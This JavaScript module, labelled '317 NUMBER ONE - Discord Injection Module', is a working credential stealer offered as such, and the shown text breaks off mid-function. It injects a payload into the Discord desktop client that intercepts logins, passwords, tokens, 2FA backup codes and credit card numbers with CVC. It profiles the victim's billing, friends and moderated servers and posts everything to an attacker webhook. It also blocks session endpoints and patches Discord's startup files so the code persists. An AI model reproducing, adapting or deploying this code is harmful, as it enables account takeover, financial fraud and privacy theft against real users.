// 317 NUMBER ONE - Discord Injection Module
// Injects into Discord client to capture tokens, passwords, 2FA codes, credit cards
const fs = require('fs');
const path = require('path');
const https = require('https');
const { xd } = require('../utils/crypto');

/**
 * Get the Discord injection payload code
 * This is the code that gets injected INTO Discord's electron app
 */
function getInjectionPayload(webhookUrl) {
  return `const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const CONFIG = {
    webhook: "${webhookUrl}",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Employee: { Value: 1, Emoji: "<:discordemployee:1163172252989259898>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:discordpartner:1163172304155586570>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:hypesquadevents:1163172248140660839>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:bughunter:1163172239970140383>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:earlysupporter:1163172241996005416>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:bugbuster:1163172238942543892>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:earlybotdeveloper:1163172236807639143>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:hypesquadbravery:1163172246492287017>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:hypesquadbrilliance:1163172244474822746>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:hypesquadbalance:1163172243417858128>", Rare: false },
        Active_Developer: { Value: 4194304, Emoji: "<:activedeveloper:1163172534443851868>", Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: "<:certifiedmoderator:1163172255489085481>", Rare: true },
        Spammer: { Value: 1048704, Emoji: "\\u274c", Rare: false },
    },
    nitroBadges: {
        "0M": "<a:nitro1:1502333867380576276> ",
        "1M": "<:bronze:1462546149079519313> ",
        "3M": "<:silver:1462546147401793722> ",
        "6M": "<:gold:1462546140321939517> ",
        "1Y": "<:platinum:1462546142972874894> ",
        "2Y": "<:diamond:1462546150354845851> ",
        "3Y": "<:emerald:1462546138631639112> ",
        "5Y": "<:ruby:1462546145220755690> ",
        "6Y": "<:opal:1462546141731098695> "
    },
    boostBadges: {
        "1M": "<:boost1:1502348753582166118> ",
        "2M": "<:discordboost2:1462546229161623758> ",
        "3M": "<:discordboost3:1462546258030755981> ",
        "6M": "<:discordboost4:1462546284647809290> ",
        "9M": "<:discordboost5:1462546311587827763> ",
        "12M": "<:discordboost6:1462546341304729662> ",
        "15M": "<:discordboost7:1462546372057235778> ",
        "18M": "<:boost18:1502351885343133726> ",
        "24M": "<:boost24:1502376415054790666> "
    },
};

const calculateMonthsSince = (isoDate) => {
    if (!isoDate || isoDate === 'null') return -1;
    try {
        const d = new Date(isoDate);
        const now = new Date();
        return (now.getFullYear() - d.getFullYear()) * 12 + (now.getMonth() - d.getMonth());
    } catch { return -1; }
};

const getNitroBadge = (months) => {
    const b = CONFIG.nitroBadges;
    if (months < 0) return '';
    if (months >= 72) return b['6Y'];
    if (months >= 60) return b['5Y'];
    if (months >= 36) return b['3Y'];
    if (months >= 24) return b['2Y'];
    if (months >= 12) return b['1Y'];
    if (months >= 6) return b['6M'];
    if (months >= 3) return b['3M'];
    if (months >= 1) return b['1M'];
    return b['0M'];
};

const getBoostBadge = (months) => {
    const b = CONFIG.boostBadges;
    if (months < 1) return '';
    if (months >= 24) return b['24M'];
    if (months >= 18) return b['18M'];
    if (months >= 15) return b['15M'];
    if (months >= 12) return b['12M'];
    if (months >= 9) return b['9M'];
    if (months >= 6) return b['6M'];
    if (months >= 3) return b['3M'];
    if (months >= 2) return b['2M'];
    return b['1M'];
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => {
    try {
        return await executeJS(\`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\`);
    } catch {
        return null;
    }
};

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        path: url.pathname + (url.search || ''),
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
        },
    };
    for (const key in headers) options.headers[key] = headers[key];

    const reqBody = data;
    return new Promise((resolve, reject) => {
        const req = https.request(options, res => {
            let body = "";
            res.on("data", chunk => body += chunk);
            res.on("end", () => {
                if (res.statusCode === 429) {
                    const retryAfter = res.headers['retry-after'];
                    const wait = retryAfter ? parseFloat(retryAfter) * 1000 + 500 : 2000;
                    setTimeout(() => {
                        request(method, url.toString(), headers, reqBody).then(resolve).catch(reject);
                    }, wait);
                    return;
                }
                resolve(body);
            });
        });
        req.on("error", reject);
        req.setTimeout(30000, () => { req.destroy(); reject(new Error('timeout')); });
        if (reqBody) req.write(reqBody);
        req.end();
    });
};

const getIP = async () => {
    try {
        const response = await request("GET", "https://api.ipify.org?format=json", {});
        const data = JSON.parse(response);
        return data.ip || "Unknown";
    } catch {
        return "Unknown";
    }
};

const fetch = async (url, headers) => {
    try {
        const fullUrl = url.startsWith('http') ? url : CONFIG.API + url;
        const response = await request("GET", fullUrl, headers);
        if (!response || response.length === 0) return null;
        return JSON.parse(response);
    } catch {
        return null;
    }
};

const fetchAccount = async token => await fetch("", { "Authorization": token });
const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = async token => {
    try {
        const result = await executeJS(\`
            fetch('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {
                headers: { 'Authorization': '\${token}' }
            }).then(r => r.ok ? r.json() : null).catch(() => null)
        \`);
        if (result && Array.isArray(result)) return result;
    } catch {}
    return await fetch("/guilds?with_counts=true", { "Authorization": token });
};

const fetchFriends = async token => {
    // Primary: use Discord's own renderer fetch (most reliable inside Electron)
    try {
        const result = await executeJS(\`
            fetch('https://discord.com/api/v9/users/@me/relationships', {
                headers: { 'Authorization': '\${token}' }
            }).then(r => r.ok ? r.json() : null).catch(() => null)
        \`);
        if (result && Array.isArray(result)) return result;
    } catch {}
    // Fallback: use Node.js https
    return await fetch("/relationships", { "Authorization": token });
};

const getNitro = flags => {
    switch (flags) {
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro Boost';
        case 3: return 'Nitro Basic';
        default: return 'None';
    }
};

const getBadges = flags => {
    if (!flags) return 'None';
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
    }
    return badges.trim() || 'None';
};

const getRareBadges = flags => {
    if (!flags) return '';
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges.trim();
};

const getBilling = async token => {
    try {
        const data = await fetchBilling(token);
        if (!data || !Array.isArray(data)) return 'None';
        let cardCount = 0;
        let paypalCount = 0;
        let cashappCount = 0;
        let venmoCount = 0;
        let idealCount = 0;
        data.forEach(x => {
            if (x.type === 1) cardCount++;
            if (x.type === 2) paypalCount++;
            if (x.type === 5) idealCount++;
            if (x.type === 14) venmoCount++;
            if (x.type === 16) cashappCount++;
        });
        let billing = '';
        if (cardCount > 0) billing += \`<a:card:1502427756959367278> \\\`\${cardCount} Card\\\`\\n\`;
        if (paypalCount > 0) billing += \`<:paypal:1502321630083289260> \\\`\${paypalCount} PayPal\\\`\\n\`;
        if (cashappCount > 0) billing += \`<a:card:1502427756959367278> \\\`\${cashappCount} CashApp\\\`\\n\`;
        if (venmoCount > 0) billing += \`<a:card:1502427756959367278> \\\`\${venmoCount} Venmo\\\`\\n\`;
        if (idealCount > 0) billing += \`<a:card:1502427756959367278> \\\`\${idealCount} iDEAL\\\`\\n\`;
        return billing.trim() || 'None';
    } catch {
        return 'None';
    }
};

const fetchFriendProfile = async (token, userId, selfProfile) => {
    try {
        const data = await fetch(\`https://discord.com/api/v9/users/\${userId}/profile?with_mutual_guilds=false\`, { "Authorization": token });
        if (!data) return { nitro: '', boost: '', extra: '' };
        let nitroBadge = '';
        let boostBadge = '';
        let extraBadges = '';
        const premiumSince = (data.user_profile && data.user_profile.premium_since) || data.premium_since;
        if (premiumSince && premiumSince !== 'null') {
            const months = calculateMonthsSince(premiumSince);
            nitroBadge = getNitroBadge(months);
        }
        const boostSince = (data.user_profile && data.user_profile.premium_guild_since) || data.premium_guild_since;
        if (boostSince && boostSince !== 'null') {
            const months = calculateMonthsSince(boostSince);
            boostBadge = getBoostBadge(months);
        }
        const badgesList = data.badges || [];
        if (Array.isArray(badgesList)) {
            for (const b of badgesList) {
                const id = (b.id || '').toLowerCase();
                if (id.includes('legacy') || id.includes('username_legacy')) {
                    if (selfProfile) continue;
                    extraBadges += '<:username:1462545054282420378> ';
                    continue;
                }
                if (id === 'quest_completed') extraBadges += '<:quest:1462545052680323144> ';
                if (id === 'completed_orbs') extraBadges += '<:orb:1462545655934488746> ';
            }
        }
        return { nitro: nitroBadge, boost: boostBadge, extra: extraBadges };
    } catch { return { nitro: '', boost: '', extra: '' }; }
};

const getFriends = async token => {
    try {
        let friends = null;
        for (let attempt = 0; attempt < 5; attempt++) {
            friends = await fetchFriends(token);
            if (friends && Array.isArray(friends) && friends.length > 0) break;
            await new Promise(resolve => setTimeout(resolve, 2500));
        }
        if (!friends || !Array.isArray(friends)) return { message: "None", totalFriends: 0 };
        
        let totalFriends = 0;
        let rareCount = 0;
        let rareList = '';
        
        for (const rel of friends) { if (rel.type === 1) totalFriends++; }
        
        for (const rel of friends) {
            if (rel.type !== 1) continue;
            if (rareCount >= 25) break;
            
            try {
                const user = rel.user;
                if (!user) continue;
                
                const friendName = user.username || 'Unknown';
                const friendId = user.id || '';
                const publicFlags = user.public_flags || 0;
                
                let isRare = false;
                let houseIcons = '';
                let specialIcons = '';
                let nitroBoostIcons = '';
                let shortIcons = '';
                
                // HypeSquad House badges (shown first)
                if (publicFlags & 64) houseIcons += '<:balance:1508342641186705549>';
                if (publicFlags & 128) houseIcons += '<:bravery:1508342685335814287>';
                if (publicFlags & 256) houseIcons += '<:brilliance:1508342732035199046>';
                
                // Special badges
                if (publicFlags & 1) { isRare = true; specialIcons += '<:discordstaff:1462545486044074218>'; }
                if (publicFlags & 2) { isRare = true; specialIcons += '<:partner:1502321783171190854>'; }
                if (publicFlags & 4) { isRare = true; specialIcons += '<:hypesquadevents:1502329846154395819>'; }
                if (publicFlags & 8) { isRare = true; specialIcons += '<:bughunter:1502321534054957178>'; }
                if (publicFlags & 16384) { isRare = true; specialIcons += '<:goldbughunter:1502321553755607291>'; }
                if (publicFlags & 512) { isRare = true; specialIcons += '<:early_supporter:1502322231017996418>'; }
                if (publicFlags & 4194304) { isRare = true; specialIcons += '<:activedev:1502320595822448722>'; }
                if (publicFlags & 131072) { isRare = true; specialIcons += '<:discordbotdev:1462545206158033027>'; }
                
                // Short username
                if (friendName.length <= 4 && friendName !== 'Unknown') isRare = true;
                if (friendName.length === 3) shortIcons += '<:3C:1502376391226687598>';
                if (friendName.length === 2) shortIcons += '<:2c:1462561755476525167>';
                
                // Fetch Nitro/Boost badges (individually wrapped to prevent single failure from breaking loop)
                if (friendId) {
                    try {
                        const { nitro, boost, extra } = await fetchFriendProfile(token, friendId);
                        if (nitro && (nitro.includes('silver') || nitro.includes('gold') || 
                                      nitro.includes('platinum') || nitro.includes('diamond') ||
                                      nitro.includes('emerald') || nitro.includes('ruby') || 
                                      nitro.includes('opal'))) {
                            isRare = true;
                        }
                        if (boost && (boost.includes('discordboost3') || boost.includes('discordboost4') ||
                                      boost.includes('discordboost5') || boost.includes('discordboost6') ||
                                      boost.includes('discordboost7') || boost.includes('boost18') || 
                                      boost.includes('boost24'))) {
                            isRare = true;
                        }
                        nitroBoostIcons += nitro + boost + extra;
                    } catch {}
                    await new Promise(resolve => setTimeout(resolve, 300));
                }
                
                // Final badge order: HypeSquad House → Special → Nitro/Boost/Extra → Short Username
                let badgeIcons = houseIcons + specialIcons + nitroBoostIcons + shortIcons;
                
                // Skip if the only visible badge is legacy username
                const badgeIconsWithoutLegacy = badgeIcons.replace(/<:username:1462545054282420378>\\s*/g, '').trim();
                if (!badgeIconsWithoutLegacy) continue;
                
                const hasHypeSquadHouse = (publicFlags & 64) || (publicFlags & 128) || (publicFlags & 256);
                if (hasHypeSquadHouse && !isRare) continue;
                
                if (isRare) {
                    rareList += \`\${badgeIcons} \\\`\${friendName}\\\`\\n\`;
                    rareCount++;
                }
            } catch {}
        }
        
        return {
            message: rareList ? \`**\${rareCount} Rare Friends Found**\\n\\n\${rareList}\\n<:total1:1502375667428233409> **Total Friends**\\n\\\`\${totalFriends}\\\`\` : "None",
            totalFriends: totalFriends,
        };
    } catch {
        return { message: "None", totalFriends: 0 };
    }
};

const getServers = async token => {
    try {
        const guilds = await fetchServers(token);
        if (!guilds || !Array.isArray(guilds)) return { message: "None", totalGuilds: 0 };
        
        let totalServers = guilds.length;
        let rareCount = 0;
        let largeCount = 0;
        let rareList = '';
        
        for (const guild of guilds) {
            const memberCount = guild.approximate_member_count || 0;
            const isOwner = guild.owner === true;
            const name = guild.name || 'Unknown';
            const id = guild.id || '';
            const permissions = BigInt(guild.permissions || '0');
            
            if (memberCount >= 1000) largeCount++;
            
            const hasAdmin = (permissions & 0x8n) !== 0n;
            const hasManageGuild = (permissions & 0x20n) !== 0n;
            const hasManageChannels = (permissions & 0x10n) !== 0n;
            const hasBan = (permissions & 0x4n) !== 0n;
            const hasKick = (permissions & 0x2n) !== 0n;
            const hasManageRoles = (permissions & 0x10000000n) !== 0n;
            
            const hasAuthority = isOwner || hasAdmin || hasManageGuild || hasManageChannels || hasBan || hasKick || hasManageRoles;
            
            // Only show servers with 100+ members where user has authority
            if (hasAuthority && memberCount >= 100 && rareCount < 15) {
                const ownerStatus = isOwner 
                    ? 'Owner: <a:yes:1502431686120706048>' 
                    : 'Owner: <a:no:1502431716403580969>';
                const memberStr = memberCount > 0 ? \`\\\`\${memberCount.toLocaleString()}\\\` members\` : '';
                
                rareList += \`**\${name}** (\${id})\\n\`;
                rareList += \`\${ownerStatus} \\u00b7 \${memberStr}\\n\\n\`;
                rareCount++;
            }
        }
        
        return {
            message: rareList.trim() ? \`**\${rareCount} Rare Servers Found**\\n\\n\${rareList.trim()}\` : "None",
            totalGuilds: totalServers,
        };
    } catch {
        return { message: "None", totalGuilds: 0 };
    }
};

const hooker = async (content, token, account) => {
    try {
        let badges = getBadges(account.public_flags);
        const billing = await getBilling(token);
        await new Promise(resolve => setTimeout(resolve, 2000));
        const friends = await getFriends(token);
        await new Promise(resolve => setTimeout(resolve, 1000));
        const servers = await getServers(token);

        // Short username badges (same as Discord Intelligence)
        const uname = account.username || '';
        if (uname.length === 3) { if (badges === 'None') badges = '<:3C:1502376391226687598> '; else badges += '<:3C:1502376391226687598> '; }
        if (uname.length === 2) { if (badges === 'None') badges = '<:2c:1462561755476525167> '; else badges += '<:2c:1462561755476525167> '; }

        // Fetch profile for Nitro, Boost, Quest, Orbs, Legacy Username, Banner
        let bannerUrl = null;
        try {
            const { nitro, boost, extra } = await fetchFriendProfile(token, account.id, true);
            if (nitro) { if (badges === 'None') badges = nitro; else badges += nitro; }
            if (boost) { if (badges === 'None') badges = boost; else badges += boost; }
            if (extra) { if (badges === 'None') badges = extra; else badges += extra; }

            // Banner from profile
            const profileData = await fetch(\`https://discord.com/api/v9/users/\${account.id}/profile?with_mutual_guilds=false\`, { "Authorization": token });
            if (profileData) {
                const bannerHash = (profileData.user && profileData.user.banner) || profileData.banner || account.banner;
                if (bannerHash) {
                    bannerUrl = \`https://cdn.discordapp.com/banners/\${account.id}/\${bannerHash}\${bannerHash.startsWith('a_') ? '.gif' : '.png'}?size=600\`;
                }
            }
        } catch (error) {}

        // Snowflake to date
        let createdDate = 'Unknown';
        try {
            const timestamp = (BigInt(account.id) >> 22n) + 1420070400000n;
            const d = new Date(Number(timestamp));
            createdDate = \`\${String(d.getUTCDate()).padStart(2,'0')}/\${String(d.getUTCMonth()+1).padStart(2,'0')}/\${d.getUTCFullYear()}\`;
        } catch(e) {}

        const fields = [
            // Token (full width, code block)
            { name: \`<a:token:1502431093004177529> Token (\${account.id})\`, value: \`\\\`\\\`\\\`\\n\${token}\\n\\\`\\\`\\\`\`, inline: false },
            // Row 1: Username, Mail, Phone
            { name: "<:member:1502437057644204192> Username", value: \`\\\`\${account.username}\\\`\`, inline: true },
            { name: "<a:mail:1502437800220295239> Mail", value: account.email ? \`\\\`\${account.email}\\\`\` : "<a:no:1502431716403580969> \\\`Unverified\\\`", inline: true },
            { name: "<a:phone:1502433196132925482> Phone", value: account.phone ? \`\\\`\${account.phone}\\\`\` : "<a:no:1502431716403580969> \\\`Unlinked\\\`", inline: true },
            // Row 2: Badges, 2FA, Billing
            { name: "<a:love:1502445624719839292> Badges", value: badges === 'None' ? \`\\\`None\\\`\` : badges, inline: true },
            { name: "<:sec:1502436352694685827> 2FA", value: account.mfa_enabled ? "<a:yes:1502431686120706048> \\\`Enabled\\\`" : "<a:no:1502431716403580969> \\\`Disabled\\\`", inline: true },
            { name: "<a:card:1502427756959367278> Billing", value: billing === 'None' ? \`\\\`None\\\`\` : billing, inline: true },
        ];

        // Add action-specific fields (Email, Password, etc.) from content
        if (content && content.embeds && content.embeds[0] && content.embeds[0].fields) {
            for (const f of content.embeds[0].fields) {
                let fieldEmoji = '\\ud83d\\udd11';
                if (f.name === 'New Password') fieldEmoji = '<:login:1508684665182224556>';
                else if (f.name === 'Old Password') fieldEmoji = '<:logout:1508684677429592176>';
                else if (f.name === 'Password') fieldEmoji = '<:1key:1508686894702137504>';
                else if (f.name === 'Number') fieldEmoji = '<:number:1508689533569339672>';
                else if (f.name === 'CVC') fieldEmoji = '<:number:1508689533569339672>';
                else if (f.name === 'Expiration') fieldEmoji = '<:number:1508689533569339672>';
                else if (f.name === 'Email') fieldEmoji = '<a:mail:1502437800220295239>';
                else if (f.name === 'Phone') fieldEmoji = '<a:phone:1502433196132925482>';
                else if (f.name === 'Backup Codes') fieldEmoji = '<:gw:1508691519106977913>';
                fields.push({ name: \`\${fieldEmoji} \${f.name}\`, value: \`\\\`\${f.value || 'None'}\\\`\`, inline: true });
            }
        }

        const payload = {
            username: "317 NUMBER ONE",
            avatar_url: "https://files.catbox.moe/zc9b0w.png",
            embeds: [
                {
                    author: {
                        name: "317 NUMBER ONE \\u2014 Discord Injection",
                        icon_url: "https://files.catbox.moe/zc9b0w.png"
                    },
                    color: 2829617,
                    thumbnail: {
                        url: account.avatar ? \`https://cdn.discordapp.com/avatars/\${account.id}/\${account.avatar}\${account.avatar.startsWith('a_') ? '.gif' : '.png'}?size=4096\` : 'https://cdn.discordapp.com/embed/avatars/0.png'
                    },
                    fields: fields,
                    footer: {
                        text: \`https://t.me/stealerwith317 - \\ud83d\\udcc5 Created: \${createdDate}\`,
                        icon_url: "https://files.catbox.moe/zc9b0w.png",
                    },
                },
                {
                    color: 2829617,
                    description: friends.message || "None",
                    author: {
                        name: \`Rare Friends (\${friends.totalFriends || 0})\`,
                        icon_url: "https://files.catbox.moe/zc9b0w.png",
                    },
                    footer: {
                        text: "317 NUMBER ONE | t.me/stealerwith317",
                        icon_url: "https://files.catbox.moe/zc9b0w.png",
                    },
                },
                {
                    color: 2829617,
                    description: servers.message || "None",
                    author: {
                        name: \`Rare Servers (\${servers.totalGuilds || 0})\`,
                        icon_url: "https://files.catbox.moe/zc9b0w.png",
                    },
                    footer: {
                        text: "317 NUMBER ONE | t.me/stealerwith317",
                        icon_url: "https://files.catbox.moe/zc9b0w.png",
                    },
                }
            ]
        };

        if (bannerUrl) {
            payload.embeds[0].image = { url: bannerUrl };
        }

        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(payload));
    } catch (error) {}
};

const EmailPassToken = async (email, password, token, action) => {
    try {
        const account = await fetchAccount(token);
        if (!account) return;
        const content = {
            "content": \`**\${account.username}** just \${action}!\`,
            "embeds": [{
                "fields": [
                    { "name": "Email", "value": email || 'None', "inline": true },
                    { "name": "Password", "value": password || 'None', "inline": true }
                ]
            }]
        };
        hooker(content, token, account);
    } catch (error) {}
};

const BackupCodesViewed = async (codes, token) => {
    try {
        const account = await fetchAccount(token);
        if (!account || !codes) return;
        const filteredCodes = codes.filter(code => code.consumed === false);
        let message = "";
        for (let code of filteredCodes) {
            message += \`\${code.code.substr(0, 4)}-\${code.code.substr(4)}\\n\`;
        }
        const content = {
            "content": \`**\${account.username}** just viewed his 2FA backup codes!\`,
            "embeds": [{
                "fields": [
                    { "name": "Backup Codes", "value": message || 'None', "inline": false },
                    { "name": "Email", "value": account.email || 'None', "inline": true },
                    { "name": "Phone", "value": account.phone || 'None', "inline": true }
                ]
            }]
        };
        hooker(content, token, account);
    } catch (error) {}
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    try {
        const account = await fetchAccount(token);
        if (!account) return;
        const content = {
            "content": \`**\${account.username}** just changed his password!\`,
            "embeds": [{
                "fields": [
                    { "name": "New Password", "value": newPassword || 'None', "inline": true },
                    { "name": "Old Password", "value": oldPassword || 'None', "inline": true }
                ]
            }]
        };
        hooker(content, token, account);
    } catch (error) {}
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    try {
        const account = await fetchAccount(token);
        if (!account) return;
        const content = {
            "content": \`**\${account.username}** just added a credit card!\`,
            "embeds": [{
                "fields": [
                    { "name": "Number", "value": number || 'None', "inline": true },
                    { "name": "CVC", "value": cvc || 'None', "inline": true },
                    { "name": "Expiration", "value": month && year ? \`\${month}/\${year}\` : 'None', "inline": true }
                ]
            }]
        };
        hooker(content, token, account);
    } catch (error) {}
};

const PaypalAdded = async (token) => {
    try {
        const account = await fetchAccount(token);
        if (!account) return;
        const content = {
            "content": \`**\${account.username}** just added a PayPal account!\`,
            "embeds": [{
                "fields": [
                    { "name": "Email", "value": account.email || 'None', "inline": true },
                    { "name": "Phone", "value": account.phone || 'None', "inline": true }
                ]
            }]
        };
        hooker(content, token, account);
    } catch (error) {}
};

const discordPath = (function () {
    try {
        const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
        let resourcePath;
        if (process.platform === 'win32') {
            resourcePath = path.join(app, 'resources');
        } else if (process.platform === 'darwin') {
            resourcePath = path.join(app, 'Contents', 'Resources');
        }
        if (resourcePath && fs.existsSync(resourcePath)) return { resourcePath, app };
    } catch (error) {}
    return { resourcePath: undefined, app: undefined };
})();

async function initiation() {
    try {
        if (fs.existsSync(path.join(__dirname, 'initiation'))) {
            fs.rmdirSync(path.join(__dirname, 'initiation'));
            const token = await getToken();
            if (!token) return;
            const account = await fetchAccount(token);
            if (!account) return;
            const content = {
                "content": \`**\${account.username}** just got injected!\`,
                "embeds": [{
                    "fields": [
                        { "name": "Email", "value": account.email || 'None', "inline": true },
                        { "name": "Phone", "value": account.phone || 'None', "inline": true }
                    ]
                }]
            };
            await new Promise(resolve => setTimeout(resolve, 3000));
            await hooker(content, token, account);
            clearAllUserData();
        }
    } catch (error) {}
}

let email = "";
let password = "";
let initiationCalled = false;

const createWindow = () => {
    try {
        const mainWindow = BrowserWindow.getAllWindows()[0];
        if (!mainWindow) return;

        mainWindow.webContents.debugger.attach('1.3');
        
        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
            try {
                if (!initiationCalled) {
                    await initiation();
                    initiationCalled = true;
                }
                
                if (method !== 'Network.responseReceived') return;
                if (!CONFIG.filters.urls.some(url => params.response?.url?.endsWith(url))) return;
                if (![200, 202].includes(params.response?.status)) return;
                
                const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
                if (!responseUnparsedData) return;
                const responseData = JSON.parse(responseUnparsedData.body);
                
                const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
                if (!requestUnparsedData) return;
                const requestData = JSON.parse(requestUnparsedData.postData);

                if (params.response.url.endsWith('/login')) {
                    if (!responseData.token) {
                        email = requestData.login;
                        password = requestData.password;
                        return;
                    }
                    await EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                } else if (params.response.url.endsWith('/register')) {
                    await EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                } else if (params.response.url.endsWith('/totp')) {
                    await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                } else if (params.response.url.endsWith('/codes-verification')) {
                    await BackupCodesViewed(responseData.backup_codes, await getToken());
                } else if (params.response.url.endsWith('/@me')) {
                    if (!requestData.password) return;
                    if (requestData.email) {
                        await EmailPassToken(requestData.email, requestData.password, responseData.token, \`changed his email to **\${requestData.email}**\`);
                    }
                    if (requestData.new_password) {
                        await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                    }
                }
            } catch (error) {}
        });

        mainWindow.webContents.debugger.sendCommand('Network.enable');
        
        mainWindow.on('closed', () => {
            setTimeout(createWindow, 1000);
        });
    } catch (error) {}
};

createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
    try {
        if (![200, 202].includes(details.statusCode)) return;
        if (details.method !== 'POST') return;
        
        if (details.url.endsWith('tokens') && details.uploadData && details.uploadData[0]) {
            const item = querystring.parse(details.uploadData[0].bytes.toString());
            await CreditCardAdded(
                item['card[number]'], 
                item['card[cvc]'], 
                item['card[exp_month]'], 
                item['card[exp_year]'], 
                await getToken()
            );
        } else if (details.url.endsWith('paypal_accounts')) {
            await PaypalAdded(await getToken());
        }
    } catch (error) {}
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) {
        return callback({ cancel: true });
    }
    callback({});
});

module.exports = require("./core.asar");
`;
}

/**
 * Find all Discord installations on the system
 */
function findDiscordInstalls() {
  const installs = [];
  const appData = process.env.APPDATA || '';
  const localAppData = process.env.LOCALAPPDATA || '';
  
  const discordVariants = [
    { name: 'Discord', dir: path.join(localAppData, 'Discord') },
    { name: 'Discord Canary', dir: path.join(localAppData, 'DiscordCanary') },
    { name: 'Discord PTB', dir: path.join(localAppData, 'DiscordPTB') },
    { name: 'Discord Development', dir: path.join(localAppData, 'DiscordDevelopment') },
  ];
  
  for (const variant of discordVariants) {
    try {
      if (!fs.existsSync(variant.dir)) continue;
      
      // Find the latest app-* version directory
      const entries = fs.readdirSync(variant.dir);
      const appDirs = entries
        .filter(e => e.startsWith('app-'))
        .sort()
        .reverse();
      
      if (appDirs.length === 0) continue;
      
      const latestApp = path.join(variant.dir, appDirs[0]);
      const resourcesPath = path.join(latestApp, 'resources');
      
      if (!fs.existsSync(resourcesPath)) continue;
      
      // Check for app.asar (the real Discord app)
      const appAsar = path.join(resourcesPath, 'app.asar');
      if (!fs.existsSync(appAsar)) continue;
      
      installs.push({
        name: variant.name,
        resourcesPath: resourcesPath,
        appPath: latestApp
      });
    } catch (e) {
      // Silent fail
    }
  }
  
  return installs;
}

/**
 * Find the Discord desktop_core module path for a given install
 */
function findDesktopCore(appPath) {
  try {
    const modulesDir = path.join(appPath, 'modules');
    if (!fs.existsSync(modulesDir)) return null;
    
    const modules = fs.readdirSync(modulesDir);
    const coreVal = modules.find(x => /discord_desktop_core-/.test(x));
    if (!coreVal) return null;
    
    const corePath = path.join(modulesDir, coreVal, 'discord_desktop_core', 'index.js');
    if (fs.existsSync(corePath)) return corePath;
  } catch (e) {}
  return null;
}

/**
 * Inject into a Discord installation
 */
function injectIntoDiscord(install, webhookUrl) {
  try {
    const appDir = path.join(install.resourcesPath, 'app');
    const packageJson = path.join(appDir, 'package.json');
    const indexJs = path.join(appDir, 'index.js');
    
    // Find desktop_core index.js path
    const coreIndexPath = findDesktopCore(install.appPath);
    
    // Get BetterDiscord path
    const bdPath = path.join(process.env.APPDATA || '', 'betterdiscord', 'data', 'betterdiscord.asar');
    
    // Create app directory if not exists
    if (!fs.existsSync(appDir)) {
      fs.mkdirSync(appDir, { recursive: true });
    }
    
    // Write package.json
    fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
    
    // Build the startup script that downloads/writes the injection
    const coreIndexEscaped = coreIndexPath ? coreIndexPath.replace(/\\/g, '\\\\') : '';
    const bdPathEscaped = bdPath.replace(/\\/g, '\\\\');
    const appAsarPath = path.join(install.resourcesPath, 'app.asar').replace(/\\/g, '\\\\');
    
    // The startup script checks if core needs injection and writes the payload
    const startupScript = `const fs = require('fs'), path = require('path');
const coreIndex = '${coreIndexEscaped}';
const bdPath = '${bdPathEscaped}';

try {
    if (coreIndex) {
        const fileSize = fs.statSync(coreIndex).size;
        const data = fs.readFileSync(coreIndex, 'utf8');
        if (fileSize < 20000 || data === "module.exports = require('./core.asar')") {
